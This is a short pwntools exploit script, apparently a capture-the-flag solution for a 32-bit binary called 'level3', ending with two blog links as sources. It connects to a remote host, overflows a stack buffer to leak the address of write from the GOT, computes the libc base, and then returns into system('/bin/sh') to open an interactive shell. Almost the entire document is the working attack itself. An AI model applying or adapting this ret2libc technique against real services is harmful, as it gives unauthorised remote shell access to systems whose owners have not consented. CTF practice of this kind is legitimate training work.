from pwn import *
p=remote("111.198.29.45",39241)
elf=ELF("./level3")
libc=ELF("./libc_32.so.6")
read_plt = elf.plt["read"]
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.symbols["main"]

p.recv()

payload="A"*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
p.sendline(payload)
xx=u32(p.recv()[0:4])
print(xx)
libc.address= xx  - libc.symbols["write"]

sys_addr = libc.symbols["system"]
bin_sh_addr = libc.search("/bin/sh").next()

payload = "A"*(0x88+0x4)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)
p.sendline(payload)
p.interactive()


#https://www.cnblog.com/mzstar/p/11716444.html
#https://cnblogs.com/jazm/p/10749895.html
